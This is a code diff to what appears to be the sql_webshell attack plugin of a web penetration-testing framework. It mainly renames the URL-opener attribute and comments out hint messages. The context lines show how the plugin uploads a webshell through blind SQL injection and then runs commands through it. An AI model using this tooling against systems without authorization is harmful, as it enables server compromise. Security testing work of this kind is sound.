@@ -96,7 +96,7 @@ class sql_webshell(baseAttackPlugin):
             freq.setHeaders( {} )
             
             bsql = blind_sqli_response_diff()
-            bsql.setUrlOpener( self._urlOpener )
+            bsql.setUrlOpener( self._url_opener )
             bsql.setEqualLimit( self._equalLimit )
             bsql.setEquAlgorithm( self._equAlgorithm )
             
@@ -142,10 +142,10 @@ class sql_webshell(baseAttackPlugin):
         if len(vulns) != 0:
             return True
         else:
-            om.out.console( 'No [blind] SQL injection vulnerabilities have been found.' )
-            om.out.console( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
-            msg = 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.'
-            om.out.console( msg )
+            #om.out.console( 'No [blind] SQL injection vulnerabilities have been found.' )
+            #om.out.console( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
+            #msg = 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.'
+            #om.out.console( msg )
             return False
 
     def exploit( self, vulnToExploit=None ):
@@ -161,7 +161,7 @@ class sql_webshell(baseAttackPlugin):
             vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
             
             bsql = blind_sqli_response_diff()
-            bsql.setUrlOpener( self._urlOpener )
+            bsql.setUrlOpener( self._url_opener )
             bsql.setEqualLimit( self._equalLimit )
             bsql.setEquAlgorithm( self._equAlgorithm )
             
@@ -214,7 +214,7 @@ class sql_webshell(baseAttackPlugin):
         bsql.setEqualLimit( self._equalLimit )
         bsql.setEquAlgorithm( self._equAlgorithm )
             
-        dbBuilder = dbDriverBuilder( self._urlOpener, bsql.equal )
+        dbBuilder = dbDriverBuilder( self._url_opener, bsql.equal )
         driver = dbBuilder.getDriverForVuln( vuln_obj )
         if driver is None:
             return None
@@ -224,13 +224,13 @@ class sql_webshell(baseAttackPlugin):
             webshell_url = self._upload_webshell( driver, vuln_obj )
             if webshell_url:
                 # Define the corresponding cut...
-                response = self._urlOpener.GET( webshell_url )
+                response = self._url_opener.GET( webshell_url )
                 self._define_exact_cut( response.getBody(), shell_handler.SHELL_IDENTIFIER )
                 
                 # Create the shell object
                 # Set shell parameters
                 shell_obj = sql_web_shell( vuln_obj )
-                shell_obj.setUrlOpener( self._urlOpener )
+                shell_obj.setUrlOpener( self._url_opener )
                 shell_obj.setWebShellURL( webshell_url )
                 shell_obj.set_cut( self._header_length, self._footer_length )
                 kb.kb.append( self.name, 'shell', shell_obj )
@@ -327,7 +327,7 @@ class sql_webshell(baseAttackPlugin):
         
         try:
             driver.writeFile( remote_path , content )
-            response = self._urlOpener.GET( test_url )
+            response = self._url_opener.GET( test_url )
         except Exception, e:
             om.out.error('Exception raised while uploading file: "' + str(e) + '".')
             return False
@@ -471,7 +471,7 @@ class sql_web_shell(shell):
         @return: The result of the command.
         '''
         to_send = self.getWebShellURL() + urllib.quote_plus( command )
-        response = self._urlOpener.GET( to_send )
+        response = self._url_opener.GET( to_send )
         return self._cut(response.getBody())
     
     def end( self ):
